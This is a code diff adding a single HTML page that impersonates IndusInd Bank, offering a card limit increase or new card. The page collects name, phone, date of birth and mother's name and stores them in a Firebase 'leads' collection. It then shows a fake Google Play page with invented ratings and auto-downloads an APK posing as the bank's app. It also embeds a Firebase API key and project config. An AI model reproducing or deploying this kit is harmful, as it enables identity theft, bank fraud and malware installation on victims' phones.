@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>IndusInd Bank - Services</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+/* CSS SAME RAHEGA */
+*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:#f0f2f5;color:#1f2937;line-height:1.4;min-height:100vh;display:flex;justify-content:center;align-items:center}img{display:block;max-width:100%}button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}input{font:inherit;color:inherit;outline:none}.brand-logo{height:40px;width:auto;object-fit:contain;display:block}.brand-logo-white{height:40px;width:auto;object-fit:contain;background:#fff;padding:4px 8px;border-radius:6px;display:block}#app{width:100%;max-width:420px;height:100vh;max-height:900px;background:#fff;position:relative;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,0.1)}@media(min-width:450px){#app{border-radius:24px;height:90vh}}.page{position:absolute;inset:0;display:flex;flex-direction:column;background:#fff;transition:transform .3s ease,opacity .3s ease;opacity:0;pointer-events:none;transform:translateX(20px)}.page.active{opacity:1;pointer-events:auto;transform:translateX(0);z-index:10}.header-dark{background:linear-gradient(135deg,#4a0418 0%,#7a0c2e 100%);color:#fff;padding:24px 20px 70px;position:relative;border-bottom-left-radius:30px;border-bottom-right-radius:30px;overflow:hidden}.top-nav{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;position:relative;z-index:2}.trust-badge{display:flex;align-items:center;gap:6px;font-size:11px;color:#fca5a5;font-weight:500}.header-title{position:relative;z-index:2}.header-title h1{font-size:26px;font-weight:700;line-height:1.2;margin-bottom:8px}.header-title p{font-size:13px;color:#fecdd3;line-height:1.4;max-width:260px}.header-light{background:#fff;padding:20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f1f2f4}.header-light .left{display:flex;align-items:center;gap:16px}.back-btn{font-size:18px;color:#4b5563;cursor:pointer;padding:8px;margin-left:-8px}.form-card{background:#fff;border-radius:20px;padding:24px 20px;margin:-40px 16px 0;position:relative;z-index:5;box-shadow:0 10px 30px rgba(0,0,0,0.06);flex:1;display:flex;flex-direction:column;overflow-y:auto}.form-container{padding:0 20px 20px;display:flex;flex-direction:column;flex:1}.input-group{margin-bottom:18px}.input-label{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:600;color:#4b5563;margin-bottom:8px}.input-wrap{display:flex;align-items:center;border:1.5px solid #e5e7eb;border-radius:10px;padding:0 14px;height:48px;background:#fff}.input-wrap:focus-within{border-color:#7a0c2e}.input-wrap input{flex:1;border:none;height:100%;background:transparent;font-size:14px;color:#111827}.input-wrap .country-code{font-size:14px;color:#374151;font-weight:500;padding-right:12px;border-right:1px solid #e5e7eb;margin-right:12px}.btn-primary{background:#7a0c2e;color:#fff;border-radius:12px;height:54px;display:flex;justify-content:center;align-items:center;gap:10px;font-size:16px;font-weight:600;width:100%;margin-top:auto;border:0}.btn-primary:active{transform:scale(.98);background:#5c0922}.service-grid{display:flex;flex-direction:column;gap:14px;margin-top:10px}.service-card{border:2px solid #e5e7eb;border-radius:14px;padding:20px 16px;display:flex;align-items:center;gap:16px;cursor:pointer;background:#fff;position:relative}.service-card.active{border-color:#7a0c2e;background:#fdf2f4}.service-icon{width:50px;height:50px;border-radius:12px;background:#f3f4f6;color:#7a0c2e;display:flex;justify-content:center;align-items:center;font-size:22px}.service-card.active .service-icon{background:#7a0c2e;color:#fff}.service-info b{display:block;font-size:16px;font-weight:700;color:#111827;margin-bottom:4px}.service-info span{font-size:12px;color:#6b7280}.check-icon{position:absolute;right:16px;top:50%;transform:translateY(-50%);font-size:20px;color:#7a0c2e;display:none}.service-card.active .check-icon{display:block}.play-store-header{background:#fff;padding:16px 20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #e5e7eb}.play-store-header img{height:26px;width:auto}.play-store-content{padding:20px;display:flex;flex-direction:column;align-items:center;text-align:center}.app-icon-large{width:90px;height:90px;border-radius:20px;box-shadow:0 4px 10px rgba(0,0,0,0.1);margin-bottom:16px;background:#fff;display:flex;justify-content:center;align-items:center;padding:8px;border:1px solid #eee}.app-icon-large img{width:100%;height:100%;object-fit:contain}.app-title{font-size:22px;font-weight:500;color:#202124;margin-bottom:4px}.app-dev{font-size:14px;color:#01875f;font-weight:500;margin-bottom:16px}.app-stats{display:flex;justify-content:space-around;width:100%;max-width:300px;margin-bottom:24px}.stat-item{display:flex;flex-direction:column;align-items:center;gap:4px}.stat-item b{font-size:16px;color:#202124;font-weight:500}.stat-item span{font-size:12px;color:#5f6368}.stat-divider{width:1px;height:30px;background:#e5e7eb}.btn-install{background:#01875f;color:#fff;border-radius:8px;height:48px;display:flex;justify-content:center;align-items:center;font-size:16px;font-weight:500;width:100%;max-width:280px;cursor:pointer;margin-bottom:15px;border:0}.btn-install i{margin-right:8px}.download-status{margin-top:10px;font-size:14px;color:#01875f;font-weight:600;display:none;flex-direction:column;align-items:center;gap:8px;width:100%;max-width:280px}.progress-bar{width:100%;height:4px;background:#e5e7eb;border-radius:2px;overflow:hidden}.progress-fill{height:100%;background:#01875f;width:0%;transition:width .3s ease}.auto-note{font-size:11px;color:#9ca3af;margin-top:8px;font-weight:400}.admin-fab{position:fixed;bottom:10px;right:10px;background:#111827;color:#fff;width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;opacity:.3;z-index:9999;text-decoration:none}.admin-fab:hover{opacity:1}
+</style>
+</head>
+<body>
+<div id="app">
+  <div class="page active" id="page-service">
+    <div class="header-dark">
+      <div class="top-nav">
+        <img class="brand-logo-white" id="logo1" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/IndusInd_Bank_Logo.svg/512px-IndusInd_Bank_Logo.svg.png" alt="IndusInd Bank">
+        <div class="trust-badge"><i class="fas fa-shield-alt"></i> Secure & Trusted</div>
+      </div>
+      <div class="header-title"><h1>Welcome to IndusInd</h1><p>Please select the service you wish to proceed with.</p></div>
+    </div>
+    <div class="form-card">
+      <div class="service-grid" id="serviceGrid">
+        <div class="service-card" data-service="limit_increase"><div class="service-icon"><i class="fas fa-chart-line"></i></div><div class="service-info"><b>Limit Increase</b><span>Request an increase on your existing card limit.</span></div><i class="fas fa-check-circle check-icon"></i></div>
+        <div class="service-card" data-service="new_card"><div class="service-icon"><i class="fas fa-plus-circle"></i></div><div class="service-info"><b>New Card Apply</b><span>Apply for a brand new IndusInd credit card.</span></div><i class="fas fa-check-circle check-icon"></i></div>
+      </div>
+      <button class="btn-primary" id="continueBtn1" style="margin-top:30px;">Continue <i class="fas fa-arrow-right"></i></button>
+    </div>
+  </div>
+  <div class="page" id="page-form">
+    <div class="header-light"><div class="left"><i class="fas fa-arrow-left back-btn" id="backBtn"></i><img class="brand-logo" id="logo2" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/IndusInd_Bank_Logo.svg/512px-IndusInd_Bank_Logo.svg.png" alt="Logo"></div><div class="trust-badge" style="color:#6b7280"><i class="fas fa-shield-alt"></i> Secure</div></div>
+    <div class="form-container" style="margin-top:20px;">
+      <h2 style="font-size:22px;font-weight:700;color:#7a0c2e;margin-bottom:8px;">Application Details</h2><p style="font-size:13px;color:#6b7280;margin-bottom:24px;">Please fill in your personal details accurately.</p>
+      <div class="input-group"><div class="input-label"><i class="far fa-user"></i> Full Name</div><div class="input-wrap"><input type="text" id="fullName" placeholder="Enter your full name"></div></div>
+      <div class="input-group"><div class="input-label"><i class="fas fa-phone-alt"></i> Mobile Number</div><div class="input-wrap"><div class="country-code">+91</div><input type="tel" id="mobileNumber" placeholder="Enter 10 digit mobile number" maxlength="10"></div></div>
+      <div class="input-group"><div class="input-label"><i class="far fa-calendar-alt"></i> Date of Birth</div><div class="input-wrap"><input type="text" id="dob" placeholder="DD / MM / YYYY" maxlength="14"></div></div>
+      <div class="input-group"><div class="input-label"><i class="fas fa-female"></i> Mother's Name</div><div class="input-wrap"><input type="text" id="motherName" placeholder="Enter mother's full name"></div></div>
+      <button class="btn-primary" id="continueBtn2" style="margin-top:20px;">Submit <i class="fas fa-check"></i></button>
+    </div>
+  </div>
+  <div class="page" id="page-playstore">
+    <div class="play-store-header"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play"></div>
+    <div class="play-store-content">
+      <div class="app-icon-large"><img id="logo3" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/IndusInd_Bank_Logo.svg/512px-IndusInd_Bank_Logo.svg.png" alt="Logo"></div>
+      <h1 class="app-title">IndusInd Bank</h1><p class="app-dev">IndusInd Bank Ltd.</p>
+      <div class="app-stats"><div class="stat-item"><b>4.5 ★</b><span>1.2M reviews</span></div><div class="stat-divider"></div><div class="stat-item"><b>5M+</b><span>Downloads</span></div><div class="stat-divider"></div><div class="stat-item"><b>P</b><span>Rated 3+</span></div></div>
+      <button class="btn-install" id="installBtn" onclick="manualDownload()"><i class="fas fa-download"></i> Install</button>
+      <div class="download-status" id="downloadStatus"><span id="statusText">Download starting in 5s…</span><div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div><span class="auto-note">Auto download will start shortly</span></div>
+    </div>
+  </div>
+</div>
+<a class="admin-fab" href="admin.html" title="Admin"><i class="fas fa-lock"></i></a>
+
+<!-- Firebase SDK -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+import { getFirestore, collection, addDoc, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+import { getStorage, ref, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
+
+// ⚠️ YAHAN APNI FIREBASE KEYS DAALEIN ⚠️
+const firebaseConfig = {
+  apiKey: "AIzaSyASphyUFKY8s3BUX6XzYFaguNYukBxIsOs",
+  authDomain: "new-project-f440c.firebaseapp.com",
+  projectId: "new-project-f440c",
+  storageBucket: "new-project-f440c.firebasestorage.app",
+  messagingSenderId: "513650334952",
+  appId: "1:513650334952:android:c8a66af2b0a964d4e7bd5d"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+const storage = getStorage(app);
+
+// Logo Load
+getDocs(query(collection(db, "settings"))).then(snapshot => {
+  snapshot.forEach(doc => {
+    if(doc.data().key === 'logo_url'){
+      document.getElementById('logo1').src = doc.data().value;
+      document.getElementById('logo2').src = doc.data().value;
+      document.getElementById('logo3').src = doc.data().value;
+    }
+  });
+}).catch(e => console.log(e));
+
+const CLIENT = { user:{name:'',phone:'',dob:'',motherName:''}, flow:{page:'service',serviceType:null} };
+function showPage(pageId){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById('page-'+pageId).classList.add('active');
+  CLIENT.flow.page=pageId;
+}
+const serviceCards=document.querySelectorAll('.service-card');
+serviceCards.forEach(card=>{
+  card.addEventListener('click',()=>{ serviceCards.forEach(c=>c.classList.remove('active')); card.classList.add('active'); CLIENT.flow.serviceType=card.dataset.service; });
+});
+document.getElementById('continueBtn1').addEventListener('click',()=>{ if(!CLIENT.flow.serviceType){alert('Please select a service to continue.');return} showPage('form'); });
+document.getElementById('backBtn').addEventListener('click',()=>showPage('service'));
+const nameInput=document.getElementById('fullName'), phoneInput=document.getElementById('mobileNumber'), dobInput=document.getElementById('dob'), motherInput=document.getElementById('motherName');
+dobInput.addEventListener('input',function(){ let v=this.value.replace(/\D/g,'').slice(0,8); let f=''; if(v.length>0)f+=v.slice(0,2); if(v.length>2)f+=' / '+v.slice(2,4); if(v.length>4)f+=' / '+v.slice(4,8); this.value=f; });
+phoneInput.addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,10)});
+
+document.getElementById('continueBtn2').addEventListener('click', async ()=>{
+  const name=nameInput.value.trim(), phone=phoneInput.value.replace(/\D/g,''), dob=dobInput.value.trim(), mother=motherInput.value.trim();
+  if(name.length<2){alert('Please enter your full name');nameInput.focus();return}
+  if(phone.length!==10){alert('Please enter a valid 10-digit mobile number');phoneInput.focus();return}
+  if(dob.length<10){alert('Please enter a valid date of birth');dobInput.focus();return}
+  if(mother.length<2){alert('Please enter your mother\'s name');motherInput.focus();return}
+
+  try {
+    await addDoc(collection(db, "leads"), { name, phone, dob, motherName: mother, serviceType: CLIENT.flow.serviceType, createdAt: new Date() });
+    showPage('playstore'); initDownloadPage();
+  } catch(e){ alert("Error saving lead: " + e.message); }
+});
+
+const installBtn=document.getElementById('installBtn'), downloadStatus=document.getElementById('downloadStatus'), progressFill=document.getElementById('progressFill'), statusText=document.getElementById('statusText');
+let autoDownloadTimer=null, hasDownloaded = false;
+function initDownloadPage(){
+  installBtn.style.display='flex'; downloadStatus.style.display='none'; progressFill.style.width='0%'; statusText.textContent='Download starting in 5s…'; hasDownloaded = false;
+  if(autoDownloadTimer) clearTimeout(autoDownloadTimer);
+  autoDownloadTimer = setTimeout(() => { if(!hasDownloaded) triggerAutoDownload(); }, 5000);
+}
+async function triggerAutoDownload(){
+  hasDownloaded = true; installBtn.style.display='none'; downloadStatus.style.display='flex'; statusText.textContent='Downloading…'; progressFill.style.width='100%';
+  setTimeout(async () => {
+    statusText.textContent='Download Complete ✓';
+    try {
+      const apkUrl = await getDownloadURL(ref(storage, 'apk/app.apk'));
+      const link=document.createElement('a'); link.href=apkUrl; link.download='App.apk'; document.body.appendChild(link); link.click(); document.body.removeChild(link);
+    } catch(e) { alert("APK not found in admin. Please upload first."); }
+  }, 500);
+}
+function manualDownload(){ if(hasDownloaded) return; hasDownloaded = true; if(autoDownloadTimer) clearTimeout(autoDownloadTimer); triggerAutoDownload(); }
+</script>
+</body>
+</html>
